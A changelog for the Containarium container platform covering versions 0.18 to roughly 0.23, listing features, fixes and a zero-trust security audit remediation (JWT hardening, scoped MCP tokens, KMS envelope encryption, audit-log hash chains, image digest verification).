- **GPU passthrough validation** — `ValidateGPU` RPC + `containarium backends validate-gpu` CLI + `backend_validate_gpu` MCP tool launch a throwaway `nvidia.runtime` LXC, run `nvidia-smi`, and report usable/model/driver (forwarding to the owning peer for remote backends); plus a standalone `scripts/validate-gpu-passthrough.sh` host→VM migration gate. Hardware-verified on an RTX 3090. (#316, #413, #415)
- **`containarium create --no-ssh-key`** — keyless, platform-managed service tenants: no `authorized_keys` seeded, operated via `incus exec` / the daemon. (#388)
- **`containarium backends versions`** — cluster version overview: each backend's daemon version vs the latest release, with a per-backend current/behind status. (#354)
- **Python telemetry distro exports traces + OTLP gRPC** — installs a real `TracerProvider`/`BatchSpanProcessor` (was a no-op that dropped spans) and selects the gRPC vs HTTP exporter from `OTEL_EXPORTER_OTLP_PROTOCOL`, via a new `grpc` extra. (#386)
- **Managed `*.<base-domain>` wildcard TLS** — with DNS-01 configured, the daemon auto-provisions (and self-heals) the wildcard subject at edge startup. (#389)
- **Podman tenant reboot durability** — `--podman` create enables the system + per-user `podman-restart.service` and `loginctl enable-linger`, so restart-policy workloads return after a host reboot/preemption; with a reboot-survival e2e. (#387, #497)
- **Deploy guard for the sentinel HMAC secret** — `scripts/deploy-binary.sh` refuses to swap a v0.19.0+ binary onto a host missing a ≥32-byte `CONTAINARIUM_SENTINEL_AUTH_SECRET`, with a new `docs/SENTINEL-AUTH-SECRET.md` runbook. (#341)

### Fixed

- **Runner provisioning SSHes as the daemon-assigned username**, not the requested name — previously left boxes orphaned and undeletable-by-name on the multi-tenant cloud. (#483)
- **Jump-server authorizes ALL request `ssh_keys`**, not just the first, and syncs create-request keys to `authorized_keys`. (#470, #471, #473)
- **Runner install** grants the runner user sudo + clears stale ephemeral config, and retries the install-state SSH probe across the keysync window. (#476, #478)
- **Fractional CPU requests** — `resources.cpu` in millicpu/decimal (`250m`, `0.25`) now maps to `limits.cpu.allowance`; whole cores still use `limits.cpu`. (#401)
- **sshpiper no longer drops live SSH sessions** on container create/delete — the yaml plugin re-reads its config per connection. (#301)
- **Caddy edge self-heals after a stub-Caddyfile revert** — the route sync rebuilds the base config, and stale `:80/:443` DNAT to a recreated Caddy container IP is reconciled away. (#400)
- **Terraform `containarium_version` upgrades take effect** — startup scripts reconcile the installed binary to the requested version on every boot. (#385)
- **eBPF Phase 0 `validate.sh` builds on stock Ubuntu** — added the multiarch include path so `clang -target bpf` finds `<asm/types.h>`. (#315)
- **Edge layer4 no longer deactivates on an empty route set**, fixing a create-flap. (#416)
- **`--http` CLI hardened against HTTP/2 edge resets** — pins HTTP/1.1, the ALPN to `http/1.1`, and drains response bodies. (#422, #468)
- **Incus exec retries the transient "Failed to retrieve PID" error.** (#425)

## [0.22.0] - 2026-05-31

Minor release: managed DNS-01 wildcard TLS, multi-domain Caddy apex management, fleet version visibility, and multi-key collaborators.

### Added

- **DNS-01 ACME for wildcard certs** — the core Caddy build now bundles the `caddy-dns` module, so the daemon issues/renews wildcard certificates via DNS-01 instead of per-host HTTP-01, with a single source of truth for the DNS-provider→module map. (#378)
- **Daemon Caddy-manages the apex of every `PublicBaseDomain`** — multi-base-domain support: each configured apex is served and auto-TLS'd. (#213)
- **Per-backend daemon version** in `get_system_info` and `/v1/backends`, so fleet version drift is visible without SSHing each host. (#354, Phase A0)
- **`GetLatestRelease` "update available" check** — the daemon can report whether a newer release exists. (#354, Phase A1)
- **`AddCollaborator` accepts multiple SSH keys** in a single call. (#369)
- **Sentinel HMAC-misconfig surfaced in `/status`** — a machine-readable `sentinel_auth_misconfigured` flag so monitoring can alert directly on the missing/short `CONTAINARIUM_SENTINEL_AUTH_SECRET` 401 loop. (#341, #373)
- **sshpiper-reload repro harness** (`hacks/repro/`) for validating hot-reload behavior (#301), with a single-VM Multipass bring-up. (#374)

### Fixed

- **App-side OpenTelemetry monitoring unblocked end-to-end** — the `--monitoring=true` ingest path now reaches the central collector. (#370, #371)

### Changed

- **Terraform module**: 0.9.x→0.21.x migration note plus a `sentinel_auth_secret` guard, so upgrades don't silently hit the HMAC 401 loop. (#375)

## [0.21.0] - 2026-05-29

Minor release: `--git-source` create plus a wake-on-HTTP fix.

### Added

- **`containarium create --git-source`** — the daemon fetches a git repo into the box at create time. (#363)

### Fixed

- **Wake-on-HTTP** returns 404 instead of a futile container start for routes with no backing container. (#362)

## [0.20.0] - 2026-05-29

Minor release: app-side OpenTelemetry distros for Python and Go, plus a wake-on-HTTP fix.

### Added

- **App-side OpenTelemetry distros for Python and Go** — `containarium-telemetry` (PyPI) and `github.com/footprintai/containarium/distros/go/containariumotel` ship as opinionated wrappers over the vanilla OTel SDKs. One-line init (`containarium_telemetry.init()` / `containariumotel.Init(ctx)`) wires the MeterProvider with the platform's resource attributes (`container.id`, `backend.id`, `service.namespace`, `service.version`) plus a defended `containarium.distro` support stamp, against the central collector that ships with `--monitoring=true`. See `docs/TELEMETRY-DISTRO-DESIGN.md`.

- **`containarium-instrument` console script** (Python) — always installed with the base package. Wraps `opentelemetry-instrument` so auto-instrumentation picks up the distro's defaults without app code changes. Adds `--dry-run` to print the resolved config (endpoint, redacted bearer headers, distro stamp) for first-line "why no metrics" debugging.

- **`containariumotel.HTTPMiddleware` + `containariumotel/grpc` sub-package** (Go) — thin wrappers over the canonical `otelhttp` / `otelgrpc` packages. gRPC ships as a sub-package so the gRPC transitive dependency only lands in apps that opt in.

- **`examples/helloworld-go`** — symmetric with the Python helloworld. Tiny HTTP server demonstrating Init + HTTPMiddleware + a hand-rolled `helloworld.requests` counter, plus a deploy.sh / systemd unit ready for the standard agent-native push flow.

- **CI workflows for the Python distro**: `distros-py-ci.yml` runs the test matrix (3.9, 3.10, 3.11, 3.12) on PRs touching `distros/py/**`; `distros-py-release.yml` publishes to PyPI via Trusted Publishing on every `v*` tag.

### Changed

- **`examples/helloworld-python` now uses `containarium-telemetry`** — two-line distro init in `app.py` plus a `helloworld.requests` counter, `requirements.txt` for the PyPI dep, and a `pip install --user` step added to `deploy.sh`. systemd unit unchanged.

- **`internal/metrics/otel.go` dogfoods the Go distro** — replaced the daemon's ad-hoc `otlpmetrichttp.New` / `resource.New` setup with `containariumotel.Init(ctx, WithServiceName, WithEndpoint, WithMetricInterval)`. `WithEndpoint` is the new distro option that wraps `otlpmetrichttp.WithEndpointURL` so callers that need a non-default ingest path (VictoriaMetrics' `/opentelemetry/api/v1/push`) don't have to fall back to env-only configuration.

### Fixed

- **wake-on-HTTP rejected every wake with "no authenticated subject in request context"** ([#357](https://github.com/FootprintAI/Containarium/pull/357)). The wake proxy invoked the container-start path with a bare `context.Background()`, so `StartContainer`'s authz gate (`RequireScope` + `AuthorizeTenant`) rejected the call — an inbound request routed to a scaled-down container returned `503 wake: start: ...` instead of waking it, making wake-on-HTTP (scale-down Phase 3) inert. Wake is a daemon-internal action triggered by a possibly-unauthenticated inbound request, so the proxy now stamps the `_system` identity (admin role, unrestricted scope) on the wake context — the same pattern the autosleep ticker and peer forwarders already use. Adds a regression test asserting the starter receives a system-identity context.

## [0.19.3] - 2026-05-27

Patch release fixing CI box creation on non-GCP backends.

### Fixed

- **jump-server: gate google-guest-agent / pwd-lock dance on GCP-only hosts** ([#351](https://github.com/FootprintAI/Containarium/issues/351) / [#352](https://github.com/FootprintAI/Containarium/pull/352)). The useradd precondition sequence — `systemctl stop google-guest-agent`, wait for `/etc/.pwd.lock` to clear, force-remove if stuck — was hardcoded for GCP VMs (where `google-guest-agent` races with local `useradd` via OS Login). On any non-GCP backend (VirtualBox lab spot, on-prem, AWS, Azure, …) the service doesn't exist; running the dance produced misleading "Access denied" stderr and force-removed lockfiles held legitimately by other processes, blocking every `containarium create` that landed on that backend.

  Fix: new `isGCPHost()` (backed by `systemd-detect-virt`, cached behind `sync.Once`) gates both `retryUseraddWithLockWait` and `waitForLocksAndRun`. Non-GCP hosts skip straight to the generic `flock + useradd` retry loop; GCP-VM deploys are byte-equivalent to v0.19.2. v0.19.2's "lacks privilege" final-error stops being misleading on non-GCP hosts — if useradd still fails after this, it's a real permission problem.

## [0.19.2] - 2026-05-27

Patch release covering the sentinel-side incident-response footguns shaken out during today's investigation: a silent tunnel-server enablement bug, three loopback / authorized-keys observability gaps that turned routine reconnects into hours-long operator drilling sessions, and the sentinel↔daemon HMAC misconfig that 401s every keysync without warning.

### Fixed

- **sentinel tunnel-server silently disabled when only `--tunnel-token-policy` is set** ([#337](https://github.com/FootprintAI/Containarium/issues/337) / [#344](https://github.com/FootprintAI/Containarium/pull/344)). Two gate conditions in `cmd/sentinel.go` checked `--tunnel-token != ""` but ignored `--tunnel-token-policy`; operators following the per-pool policy syntax got no listener and no error. Gates now accept either flag.

- **loopback aliases leaked on sentinel shutdown** ([#337](https://github.com/FootprintAI/Containarium/issues/337) follow-up / [#346](https://github.com/FootprintAI/Containarium/pull/346)). The per-spot `127.0.0.x` aliases persisted across restarts, blocking fresh allocations from the 127.0.0.2-254 pool. New `TunnelRegistry.UnregisterAll()` is `defer`-wired at both registry-creation sites; clean shutdown AND `SIGINT`/`SIGTERM` both drop every alias before exit.

- **HMAC sentinel-auth misconfig was silent** ([#341](https://github.com/FootprintAI/Containarium/issues/341) §1 / [#347](https://github.com/FootprintAI/Containarium/pull/347)). When `CONTAINARIUM_SENTINEL_AUTH_SECRET` was missing the daemon 401'd every protected request and the sentinel emitted unsigned requests forever — with only a single startup `WARNING` line that scrolled out of journals within hours. Both sides now log a rate-limited `WARNING` (once per 60s) on every actual cycle, so operators tailing the journal during an incident see the misconfig in real time.

- **stale `/authorized-keys` entries for deleted tenants** ([#343](https://github.com/FootprintAI/Containarium/issues/343) / [#348](https://github.com/FootprintAI/Containarium/pull/348)). When a tenant container was deleted but the host user / home dir survived (userdel lock contention, manual provisioning), sshpiper would accept the client's key and then the relay would fail mid-session with `Container <name>-container not found`. The keys endpoint now filters at read time using a `containerExistsFn` callback wired to the live container registry, and logs orphan entries with the exact cleanup command. Bonus: system accounts (`ubuntu`, `root`, anything in `/home` without a matching tenant) are also dropped from the response — they were always returned and were never valid sshpiper upstreams.

- **loopback alias allocator drifted upward across reconnects** ([#342](https://github.com/FootprintAI/Containarium/issues/342) / [#349](https://github.com/FootprintAI/Containarium/pull/349)). The previous `nextIP` cursor advanced monotonically and never rewound on `Unregister`, so a single backend that bounced landed on a different `127.0.0.X` each time. `allocateOctet(spotID)` now derives a deterministic preferred slot from `fnv32a(spotID) mod 253 + 2` and linear-probes only on collision. A backend that reconnects gets the same slot — sshpiper config stays valid through churn and `ss -tlnp` output matches the config.

### Known issues

- Sentinel `[keysync]`/`[certsync]` 401s against pre-tightening spots from the v0.18+ endpoint-auth change ([#345](https://github.com/FootprintAI/Containarium/issues/345)). Needs a design call on the sentinel↔spot trust model (PSK vs JWT vs mTLS); deferred.
- #341 §2 (deploy script auto-provisions the env var on upgrade) is a deploy-automation concern and tracked on the issue.

## [0.19.1] - 2026-05-27

Patch release fixing the embedded Grafana monitoring iframe on auth-enabled deploys.

### Fixed

- **monitoring iframe 401** ([#338](https://github.com/FootprintAI/Containarium/issues/338) / [#339](https://github.com/FootprintAI/Containarium/pull/339)). The webui's monitoring page iframes `/grafana/d/...` on the same origin, but browsers can't attach `Authorization: Bearer …` headers to `<iframe src=…>` loads — so every embedded Grafana request hit the daemon's auth middleware bare and got `{"error":"missing authorization header","code":401}`. The page was functionally broken on any deploy with auth enabled.

  Fix: the daemon's `auth.AuthMiddleware.HTTPMiddleware` now accepts a `containarium_session` cookie as a fallback to the bearer header (bearer still wins when both are present). New `POST/DELETE /v1/auth/session` endpoint promotes/clears the cookie (HttpOnly, SameSite=Lax, Secure unconditionally, Max-Age bounded by JWT lifetime). The webui calls the promote endpoint on monitoring-page mount before painting the iframe. Cookie value is the raw JWT — no new credential material, no change to revocation / expiry / refresh-token rejection semantics. CLI/MCP/API clients see no behavior change.

### Known issues

- The sentinel's `tunnel-server` silently fails to accept tunnel-client connections when `--tunnel-token` is omitted in favor of policy-only flags ([#337](https://github.com/FootprintAI/Containarium/issues/337)). Workaround documented on the issue; fix deferred to a follow-up release.

## [0.19.0] - 2026-05-27

Headline: **agent-box reaches the CI surface** — the platform now provisions GitHub-Actions ephemeral runners, owns the compose-autostart contract end-to-end, and ships the MCP / CLI surface (`login`, `whoami`, `ssh setup`, `runner provision`, compose-autostart tools) that lets an agent or a script drive a Containarium host without hand-rolling SSH glue. Plus the trailing useradd-on-jumpserver fixes that closed [`cloud#163`](https://github.com/FootprintAI/Containarium-cloud/issues/163).

### Added — CI runner pool

- **Runner kit** ([#302](https://github.com/FootprintAI/Containarium/pull/302), [#304](https://github.com/FootprintAI/Containarium/pull/304)) — Containarium as a GHA ephemeral runner pool; `containarium runner provision` CLI + MCP tool spins one up agent-driven.
- **Pattern B docs** ([#303](https://github.com/FootprintAI/Containarium/pull/303)) — runner orchestrates nested per-job, with the trade-offs vs. flat pools written down.

### Added — compose-autostart end-to-end

- **Phase B** — agent-box MCP tools ([#310](https://github.com/FootprintAI/Containarium/pull/310))
- **Phase C** — daemon proto + RPC + CLI ([#317](https://github.com/FootprintAI/Containarium/pull/317), [#323](https://github.com/FootprintAI/Containarium/pull/323), [#324](https://github.com/FootprintAI/Containarium/pull/324))
- **Phase D** — `containarium create --auto-restart-compose=<dir>` ([#326](https://github.com/FootprintAI/Containarium/pull/326))
- **Platform compose-autostart MCP tools** ([#325](https://github.com/FootprintAI/Containarium/pull/325))
- **Design note** ([#309](https://github.com/FootprintAI/Containarium/pull/309)) — captures why this lands platform-level rather than per-image.

### Added — CLI / MCP surface

- **`containarium login` / `logout` / `whoami`** ([#305](https://github.com/FootprintAI/Containarium/pull/305)) — A3 of the agent-onboarding plan; replaces ad-hoc `~/.containarium/credentials.json` editing.
- **`containarium ssh setup` / `list` / `remove` / `propagate`** + **`login --with-ssh-setup`** ([#307](https://github.com/FootprintAI/Containarium/pull/307)) — A5/A6/A7; one-shot SSH key onboarding from any client.
- **MCP credentials.json fallback for token** ([#311](https://github.com/FootprintAI/Containarium/pull/311)) — A4; MCP tools pick up the credentials file when no env token is set.
- **TTL CLI verbs** — `containarium ttl set / get / unset` ([#297](https://github.com/FootprintAI/Containarium/pull/297)) for box auto-delete scheduling.
- **TTL sweeper + handler** ([#299](https://github.com/FootprintAI/Containarium/pull/299), [#300](https://github.com/FootprintAI/Containarium/pull/300)) — proto RPC + decision logic + keep-on-failure chain.
- **Agent-box CI MCP resources** ([#298](https://github.com/FootprintAI/Containarium/pull/298), [#296](https://github.com/FootprintAI/Containarium/pull/296)) — `ci-context` + `ci-prompt` resources with an opinionated debug playbook.
- **Post-login banner rotation hint** ([#333](https://github.com/FootprintAI/Containarium/pull/333)) — K2; banner now nudges users toward token rotation.
- **Env-var defaults + CLI-only install script** ([#295](https://github.com/FootprintAI/Containarium/pull/295)) — unblocks the GHA Action path.

### Added — Air-gapped install + ebpf

- **Air-gapped install bundle** ([#308](https://github.com/FootprintAI/Containarium/pull/308), E3b) — `offline-install.sh`, release-pipeline matrix, GHES support.
- **ebpf Phase 0** ([#292](https://github.com/FootprintAI/Containarium/pull/292)) — bridge-attach validator (shell + Go paths).

### Fixed — Jump-server useradd reliability

The fail-fast + serialization fixes that took the useradd path from "retries-until-misleading-lock-error" to "errors clearly, immediately":

- **Surface useradd output when all retries exhaust** ([#320](https://github.com/FootprintAI/Containarium/pull/320)) — `lastOutput` captured so the final error includes the real stderr.
- **Fail-fast on `Permission denied`** ([#322](https://github.com/FootprintAI/Containarium/pull/322), closes [containarium-run#15](https://github.com/FootprintAI/containarium-run/issues/15)) — distinguishes "non-root can't write /etc/passwd" from "transient lock," fails immediately on the former.
- **Serialize useradd + exponential backoff + mid-loop lock cleanup** ([#335](https://github.com/FootprintAI/Containarium/pull/335), closes [cloud#163](https://github.com/FootprintAI/Containarium-cloud/issues/163)) — concurrent useradds no longer thrash; stale locks get cleaned up between attempts.

### Fixed — Other

- **`containarium version` subcommand on install** ([#321](https://github.com/FootprintAI/Containarium/pull/321)) — installer now uses the actual subcommand rather than `--version` which isn't a flag.

### Tests / Docs

- **MCP K3 + K4 + K5 + 60-second doc** ([#334](https://github.com/FootprintAI/Containarium/pull/334)) — API-token verify tests + new operator quickstart.
- **VM-migration plan + OSS-disclosure rule** ([#313](https://github.com/FootprintAI/Containarium/pull/313)) — host→VM migration plan written down; CLAUDE.md gains a rule on what may leak into OSS commits.

### Chores

- **Scrub leaked deploy tokens + apply OSS-anonymization rule** ([#314](https://github.com/FootprintAI/Containarium/pull/314)) — closes a token leak from an earlier commit; the rule from #313 in force from here on.
- **Dependencies**: bumps for `google.golang.org/api`, `grpc-gateway/v2`, `mcp-go`, `pgx/v5`, `cloud.google.com/go/compute`, and `docker/setup-buildx-action` ([#319](https://github.com/FootprintAI/Containarium/pull/319), [#327](https://github.com/FootprintAI/Containarium/pull/327), [#328](https://github.com/FootprintAI/Containarium/pull/328), [#329](https://github.com/FootprintAI/Containarium/pull/329), [#330](https://github.com/FootprintAI/Containarium/pull/330), [#332](https://github.com/FootprintAI/Containarium/pull/332)).

## [0.18.0] - 2026-05-22

Ships the **zero-trust security audit remediation** — 46 PRs across 5 phases closing all 41 numbered findings from the internal audit ([`docs/security/ZERO-TRUST-AUDIT.md`](docs/security/ZERO-TRUST-AUDIT.md)). The headline shifts: every API surface is now authenticated by scope, every secret is decryptable through a pluggable KMS, every audit log row is in a tamper-evident hash chain, and every container-image pull is verified against the registry's published digest. Operators get a full runbook at [`docs/security/OPERATOR-SECURITY-RUNBOOK.md`](docs/security/OPERATOR-SECURITY-RUNBOOK.md).

### Security — Authentication & RBAC

- **JWT hardening — `iss` / `aud` / minimum secret length** ([#231](https://github.com/FootprintAI/Containarium/pull/231)). Every issued token now carries `iss=containarium` + `aud=containarium-api`; ValidateToken refuses tokens missing either. Daemon refuses to start with a JWT secret shorter than 32 bytes.
- **Refresh-token rotation (`tt` claim)** ([#254](https://github.com/FootprintAI/Containarium/pull/254), [#255](https://github.com/FootprintAI/Containarium/pull/255)). Tokens now carry `tt=access|refresh`; only `access` authenticates the API surface. New `RefreshToken` RPC mints a fresh `(access, refresh)` pair and revokes the input refresh token's `jti` — refresh tokens are single-use. Replay returns Unauthenticated.
- **JWT revocation (`jti` + revocation list)** ([#248](https://github.com/FootprintAI/Containarium/pull/248), [#249](https://github.com/FootprintAI/Containarium/pull/249), [#252](https://github.com/FootprintAI/Containarium/pull/252), [#278](https://github.com/FootprintAI/Containarium/pull/278), [#279](https://github.com/FootprintAI/Containarium/pull/279)). Every token carries a `jti` claim; new Postgres-backed `RevocationStore` rejects revoked tokens at auth time. Operator surface: `containarium token {revoke,list-revoked,inspect}`, MCP `revoke_token` tool (`tokens:write` scope), `RevokeToken` / `ListRevokedTokens` RPCs.
- **Per-tool MCP scopes** ([#250](https://github.com/FootprintAI/Containarium/pull/250)). MCP tokens can be issued with narrow `--scopes` (e.g. `containers:read`, `secrets:write`); each tool checks its required scope, returning least-privilege-friendly errors instead of running.
- **Daemon-side scope enforcement on REST/gRPC** ([#251](https://github.com/FootprintAI/Containarium/pull/251), [#253](https://github.com/FootprintAI/Containarium/pull/253), [#265](https://github.com/FootprintAI/Containarium/pull/265), [#266](https://github.com/FootprintAI/Containarium/pull/266)). Scope claims now propagate end-to-end and gate every server-side handler — agent-side scope filtering can't be the only barrier.
- **Admin RBAC on cluster-level ops** ([#234](https://github.com/FootprintAI/Containarium/pull/234), [#246](https://github.com/FootprintAI/Containarium/pull/246), [#247](https://github.com/FootprintAI/Containarium/pull/247)). 33 cluster-wide RPCs now require the `admin` role; container-scoped RPCs additionally require ownership match (`container_name` → owner authz on 7 endpoints including traffic and ClamAV).
- **WebSocket subprotocol auth** ([#245](https://github.com/FootprintAI/Containarium/pull/245)). Terminal + SSE WebSockets now authenticate via Sec-WebSocket-Protocol bearer rather than `?token=` query parameters, which leak through proxies and access logs.
- **Endpoint-auth tightening** ([#233](https://github.com/FootprintAI/Containarium/pull/233)). All non-public endpoints now require valid JWT; previously-anonymous paths gated.

### Security — Secrets & KMS envelope encryption

- **KMS envelope encryption** (audit C-HIGH-6) — full 6-phase rollout that lets operators pull the decrypt key off the daemon host into a managed KMS.
  - **Phase A** — `KMSClient` interface + in-process no-op impl ([#268](https://github.com/FootprintAI/Containarium/pull/268))
  - **Phase B** — Store envelope-path wiring, dual-mode reads ([#269](https://github.com/FootprintAI/Containarium/pull/269))
  - **Phase D** — legacy→envelope migration tool + coverage CLI ([#270](https://github.com/FootprintAI/Containarium/pull/270))
  - **Phase E** — `CONTAINARIUM_REQUIRE_ENVELOPE=true` retirement gate ([#272](https://github.com/FootprintAI/Containarium/pull/272))
  - **Phase F** — Vault Transit backend (raw HTTP, no SDK dependency) ([#271](https://github.com/FootprintAI/Containarium/pull/271))
  - **Phase C** — Google Cloud KMS backend ([#281](https://github.com/FootprintAI/Containarium/pull/281))
- **tmpfs secret delivery** (audit C-MED-4) — new `--delivery=file` mode writes secrets to `/run/secrets/<NAME>` (tmpfs, mode `0440 root:<tenant>`) instead of env vars, which are visible in `/proc/<pid>/environ` to anyone who can shell into the container.
  - **Phase A** — field plumbing ([#274](https://github.com/FootprintAI/Containarium/pull/274))
  - **Phase B-1** — file writer ([#275](https://github.com/FootprintAI/Containarium/pull/275))
  - **Phase B-2** — chown to tenant user ([#276](https://github.com/FootprintAI/Containarium/pull/276))
  - **Phase B-3** — re-stamping reconciler (60s tick) ([#277](https://github.com/FootprintAI/Containarium/pull/277))
- **Postgres credentials from secret-file** ([#260](https://github.com/FootprintAI/Containarium/pull/260)). New `CONTAINARIUM_POSTGRES_URL_FILE` / `_PASSWORD_FILE` env vars let operators store DB credentials at `0600` files instead of inline env. Permissions checked at load.
- **Master-key file permission check** ([#235](https://github.com/FootprintAI/Containarium/pull/235)). Daemon refuses to start if `/etc/containarium/secrets.key` has any non-owner bit set — catches umask drift and ownership change.

### Security — Audit log & tamper evidence

- **Audit-log hash chain** ([#243](https://github.com/FootprintAI/Containarium/pull/243)). Every audit row now carries `prev_hash` + `row_hash` (Phase 4.5). `SELECT FOR UPDATE` on the chain tail serializes concurrent appends; a tampered row breaks the chain and is detected by `containarium audit verify`.
- **Audit hygiene** ([#242](https://github.com/FootprintAI/Containarium/pull/242)). Sensitive fields (tokens, passwords, key material) redacted at insert; request-correlation IDs propagated end-to-end; tightened file permissions on audit artifacts.
- **Operator-facing audit CLI** ([#280](https://github.com/FootprintAI/Containarium/pull/280)). `containarium audit query` filters by username/action/resource-type/time-range; `containarium audit verify` walks the hash chain in batches and reports the first broken row. Direct Postgres access; no daemon route needed.

### Security — Supply-chain (image digest verification)

- **Registry allowlist + operator-enforced digest pinning** ([#236](https://github.com/FootprintAI/Containarium/pull/236), [#261](https://github.com/FootprintAI/Containarium/pull/261)). `CONTAINARIUM_ALLOWED_IMAGE_REGISTRIES` restricts which simplestreams remotes are reachable; `CONTAINARIUM_REQUIRE_IMAGE_DIGEST` forces every image reference to end with `@sha256:<64-hex>` (sha256 only, lowercase-hex).
- **Full registry-side digest verification** (audit B-HIGH-1) — end-to-end pull-byte verification gated by a single env var.
  - **Design** — pre-pull simplestreams resolve + post-pull defense-in-depth ([#282](https://github.com/FootprintAI/Containarium/pull/282))
  - **Phase A** — simplestreams index resolver ([#283](https://github.com/FootprintAI/Containarium/pull/283))
  - **Phase B** — `CONTAINARIUM_VERIFY_IMAGE_DIGEST=true` pre-pull gate ([#284](https://github.com/FootprintAI/Containarium/pull/284))
  - **Phase D** — operator runbook + soak-mode rollout pattern ([#285](https://github.com/FootprintAI/Containarium/pull/285))
  - **Phase C** — post-pull `volatile.base_image` fingerprint check (defense-in-depth) ([#288](https://github.com/FootprintAI/Containarium/pull/288))
  - **Follow-ups** — VERIFY-without-REQUIRE startup WARNING + abuse tripwires ([#286](https://github.com/FootprintAI/Containarium/pull/286)); TTL cache for the simplestreams resolver ([#287](https://github.com/FootprintAI/Containarium/pull/287))

### Security — Sentinel, TLS, and operational hardening

- **`/wake/` source-IP allowlist** ([#244](https://github.com/FootprintAI/Containarium/pull/244)). Wake-on-HTTP rejects callers outside `CONTAINARIUM_WAKE_TRUSTED_PROXIES`; before, anyone on the daemon's network could trigger a wake by crafting `Host`.
- **MCP HTTPS pinning + OTel bind override** ([#238](https://github.com/FootprintAI/Containarium/pull/238)). MCP tools refuse non-HTTPS daemon URLs unless explicitly opted in; OTel receiver bind is operator-configurable rather than wildcard-default.
- **Fail-closed startup checks** ([#235](https://github.com/FootprintAI/Containarium/pull/235)). Daemon refuses to start when a JWT secret is configured but unreadable, or when `REQUIRE_ENVELOPE=true` but no KMS backend is wired.
- **Terraform firewall tightening** ([#237](https://github.com/FootprintAI/Containarium/pull/237)). Sentinel SSH port narrowed from `22` (open to `0.0.0.0/0`) to operator-supplied allowlist; defaults removed. IAP-only mode for management access.
- **OTel collector-side bearer enforcement** ([#263](https://github.com/FootprintAI/Containarium/pull/263), [#264](https://github.com/FootprintAI/Containarium/pull/264), audit C-HIGH-5 closed). Collector now rejects un-bearered OTLP submissions when `OTEL_BEARER_REQUIRED=true`; daemon stamps the bearer header on monitoring-enabled containers.
- **Input bounds + explicit SSH-key newline check** ([#240](https://github.com/FootprintAI/Containarium/pull/240)). `CreateContainer` rejects oversized `ssh_keys` / `stack_parameters` / `labels`; SSH-key validator rejects embedded `\r\n` before base64-decode (previously rejection was incidental, not load-bearing).
- **Operational hardening pass** ([#239](https://github.com/FootprintAI/Containarium/pull/239), [#241](https://github.com/FootprintAI/Containarium/pull/241)). gosec inline directives, tightened file modes on operator-generated artifacts.

### Security — Process & tooling

- **`/swagger-ui/` gated behind admin role** ([#256](https://github.com/FootprintAI/Containarium/pull/256), audit A-LOW-1).
- **CI security scanners verified** ([#257](https://github.com/FootprintAI/Containarium/pull/257)). `gosec`, `govulncheck`, `trivy` all run on push, PR, and weekly; SARIF uploads to GitHub code scanning; `govulncheck` fails the build on known-fixed vulns.
- **`SECURITY.md` published** ([#257](https://github.com/FootprintAI/Containarium/pull/257)). Disclosure policy, SLAs, 90-day coordinated-disclosure window, scope.
- **Abuse-case regression suite** ([#259](https://github.com/FootprintAI/Containarium/pull/259), audit Phase 5.4). 12 scenarios in `internal/auth/abuse_test.go` — revoked-token replay, refresh-rotation replay, wrong-tenant access, scope confusion, tampered signature, `alg=none` confusion, etc. — that all MUST fail closed. CI tripwire for any future refactor that flips a deny to allow.

### Added — CLI / MCP surface

- **`containarium audit query` / `audit verify`** ([#280](https://github.com/FootprintAI/Containarium/pull/280)).
- **`containarium token revoke` / `list-revoked` / `inspect`** ([#249](https://github.com/FootprintAI/Containarium/pull/249), [#278](https://github.com/FootprintAI/Containarium/pull/278), [#279](https://github.com/FootprintAI/Containarium/pull/279)).
- **`containarium secrets migrate-to-envelope` / `envelope-coverage`** ([#270](https://github.com/FootprintAI/Containarium/pull/270)).
- **`containarium secrets set --delivery=env|file`** ([#274](https://github.com/FootprintAI/Containarium/pull/274)).
- **`RefreshToken` REST / gRPC endpoint** at `POST /v1/tokens/refresh` ([#255](https://github.com/FootprintAI/Containarium/pull/255)).
- **`RevokeToken` / `ListRevokedTokens` REST / gRPC endpoints** at `POST /v1/tokens/revoke` and `GET /v1/tokens/revoked` ([#249](https://github.com/FootprintAI/Containarium/pull/249), [#278](https://github.com/FootprintAI/Containarium/pull/278)).
- **MCP `revoke_token`** tool ([#252](https://github.com/FootprintAI/Containarium/pull/252)).

### Documentation

- **Zero-trust audit and remediation TODO** at [`docs/security/ZERO-TRUST-AUDIT.md`](docs/security/ZERO-TRUST-AUDIT.md) and [`docs/security/ZERO-TRUST-TODO.md`](docs/security/ZERO-TRUST-TODO.md) — full audit, all 41 numbered items now `[x]`.
- **Operator security runbook** at [`docs/security/OPERATOR-SECURITY-RUNBOOK.md`](docs/security/OPERATOR-SECURITY-RUNBOOK.md) ([#262](https://github.com/FootprintAI/Containarium/pull/262), expanded across the session). Covers token lifecycle, leak response, agent-token least-privilege, JWT/Postgres credential rotation, KMS envelope rollout for both Vault and GCP, image digest pinning + verification, auditing administrative actions, `/wake/` lockdown.
- **Design notes** at [`docs/security/KMS-ENVELOPE-DESIGN.md`](docs/security/KMS-ENVELOPE-DESIGN.md), [`docs/security/IMAGE-DIGEST-VERIFY-DESIGN.md`](docs/security/IMAGE-DIGEST-VERIFY-DESIGN.md), [`docs/security/SECRETS-ENV-VAR-RISK.md`](docs/security/SECRETS-ENV-VAR-RISK.md) ([#258](https://github.com/FootprintAI/Containarium/pull/258), [#267](https://github.com/FootprintAI/Containarium/pull/267)) — threat model + multi-phase rollout for each major remediation.
- **Phase-0 operator runbook** at [`docs/security/PHASE-0-OPERATOR-RUNBOOK.md`](docs/security/PHASE-0-OPERATOR-RUNBOOK.md) ([#232](https://github.com/FootprintAI/Containarium/pull/232)).
- **README architecture and security sections** updated to reflect the new gates and env-var surface.

### Breaking

- **JWT validation now requires `iss` and `aud`**. Tokens minted by older `containarium token generate` (pre-#231) won't validate. Operators must re-mint any long-lived tokens — `containarium token inspect <token>` shows whether the claims are present.
- **`/swagger-ui/` requires admin auth** ([#256](https://github.com/FootprintAI/Containarium/pull/256)). Unauthenticated callers get 401; non-admin callers get 403.
- **WebSocket auth via `?token=` is removed** ([#245](https://github.com/FootprintAI/Containarium/pull/245)). Clients must use the `Sec-WebSocket-Protocol` subprotocol form. The CLI was updated in the same PR; out-of-tree integrations need to follow.
- **Terraform sentinel SSH default narrowed** ([#237](https://github.com/FootprintAI/Containarium/pull/237)). New deployments require an explicit `allowed_ssh_sources` rather than getting `0.0.0.0/0`. Existing deployments are not auto-tightened — operators flip the var to opt in.

## [0.17.0] - 2026-05-18

